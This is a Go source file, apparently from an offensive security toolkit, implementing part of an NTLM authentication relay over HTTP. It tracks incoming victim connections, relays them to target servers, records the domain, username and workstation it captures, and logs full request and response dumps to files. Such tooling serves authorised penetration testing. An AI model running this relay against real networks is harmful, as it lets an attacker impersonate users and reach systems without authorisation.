package gopRelay

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httputil"
	"os"
	"strings"
	"sync"
	"text/tabwriter"

	"github.com/google/uuid"
	"github.com/hophouse/gop/utils/logger"
)

type NTLMAuthHTTPRelay struct {
	ClientConnUUID string
	clientConn     *net.TCPConn
	Reader         *bufio.Reader
	RemoteIP       string
	Relays         map[string]*Relay
	mu             *sync.Mutex
	step           string
}

type Relay struct {
	relayUUID            string
	parentClientConnUUID string
	target               string
	conn                 *http.Client
	mu                   *sync.Mutex
	filename             string
	Domain               string
	Username             string
	Workstation          string
	AuthorizationHeader  string
}

var connexions = map[string]*NTLMAuthHTTPRelay{}

var ProcessIncomingConnChan = make(chan incomingConn)

type incomingConn struct {
	f    func(*NTLMAuthHTTPRelay, *net.TCPConn, string) error
	conn *net.TCPConn
}

func RunRelayServer(targets []string) {
	logger.Print("[+] Targets :\n")
	for i, target := range targets {
		logger.Printf("\t%d : %s\n", i, target)
	}

	// Handle new connexion independently of the protocol
	go func() {
		for item := range ProcessIncomingConnChan {
			remoteIP := strings.Split(item.conn.RemoteAddr().String(), ":")[0]
			client, exist := connexions[remoteIP]
			if !exist || client.step == "Authentication" {
				connexion := NTLMAuthHTTPRelay{
					ClientConnUUID: strings.Split(uuid.NewString(), "-")[0],
					clientConn:     item.conn,
					Reader:         bufio.NewReader(item.conn),
					Relays:         map[string]*Relay{},
					mu:             &sync.Mutex{},
					RemoteIP:       remoteIP,
					step:           "Uknown",
				}

				connexions[remoteIP] = &connexion
				client = connexions[remoteIP]
				logger.Printf("[+] Connexion : Adding connexion %s to the connexion list with UUID %s\n", remoteIP, client.ClientConnUUID)
			} else {
				logger.Printf("[+] Connexion : %s already in the connexion list with UUID %s at step %s\n", remoteIP, client.ClientConnUUID, client.step)
				return
			}

			for _, target := range targets {
				// if relay not present
				r, exist := client.Relays[target]
				if exist {
					logger.Printf("[+] Relay : %s already in the relay list with UUID %s of connexion %s\n", target, r.relayUUID, client.ClientConnUUID)
					continue
				}

				logger.Printf("[+] Relay : Process for target %s with connexion %s\n", target, client.ClientConnUUID)

				go func() {
					err := item.f(client, item.conn, target)
					if err != nil {
						logger.Printf("Error while processing targets: %s\n", err)
						return
					}

					DisplayConnexions(connexions)
				}()
			}
		}
	}()

}

func DisplayConnexions(connexions map[string]*NTLMAuthHTTPRelay) {
	logger.Print("\n[+] Connexions:\n")

	w := tabwriter.NewWriter(os.Stdout, 8, 0, 4, ' ', 0)

	for remoteIP, connexion := range connexions {
		if len(connexion.Relays) > 0 {
			for target, relay := range connexion.Relays {
				logger.Fprintf(w, "%s\t%s\t%s\t%s\\%s@%s\t%s\n", connexion.ClientConnUUID, remoteIP, relay.relayUUID, relay.Domain, relay.Username, relay.Workstation, target)
			}
		}
	}

	w.Flush()
	logger.Print("\n")
}

func (r *Relay) SendRequestGetResponse(clientRequest *http.Request, c string, s string) (*http.Response, error) {
	r.mu.Lock()
	defer r.mu.Unlock()

	clientRequest.Header.Set("Connection", "keep-alive")
	clientRequest.Header.Set("Keep-Alive", "timeout=8888888888888888, max=88888888")
	clientRequest.Header.Set("Accept-Encoding", "deflate")
	if clientRequest.Header.Get("Content-Length") == "" {
		clientRequest.Header.Set("Content-Length", "0")
	}

	clientRequestDump, err := httputil.DumpRequest(clientRequest, true)
	if err != nil {
		logger.Fprintln(logger.Writer(), err)
		return nil, err
	}

	for _, line := range strings.Split(string(clientRequestDump), "\n") {
		logger.Fprintf(logger.Writer(), "%s | %s | %s -> %s : %s\n", r.parentClientConnUUID, r.relayUUID, c, s, line)
	}
	logger.Fprint(logger.Writer(), "\n")

	clientResponse, err := r.conn.Do(clientRequest)
	if err != nil {
		logger.Fprintln(logger.Writer(), err)
		return nil, err
	}
	clientResponseDump, err := httputil.DumpResponse(clientResponse, true)
	if err != nil {
		logger.Fprintln(logger.Writer(), err)
		return nil, err
	}

	// Usefull to reuse the connection
	// It avoids closing the connection when Keep-Alice is active
	io.Copy(io.Discard, clientResponse.Body)
	clientResponse.Body.Close()

	for _, line := range strings.Split(string(clientResponseDump), "\n") {
		logger.Fprintf(logger.Writer(), "%s | %s | %s <- %s : %s\n", r.parentClientConnUUID, r.relayUUID, c, s, line)
	}
	logger.Fprint(logger.Writer(), "\n")

	f, err := os.OpenFile(r.filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		logger.Println(err)
	}
	defer f.Close()

	_, err = f.Write(clientRequestDump)
	if err != nil {
		logger.Println(err)
	}

	_, err = f.Write(clientResponseDump)
	if err != nil {
		logger.Println(err)
	}

	return clientResponse, nil
}

func (r *Relay) SendResponseGetRequest(clientResponse []byte, c string, s string) (*http.Request, error) {
	return nil, fmt.Errorf("function not yet implemented")
}
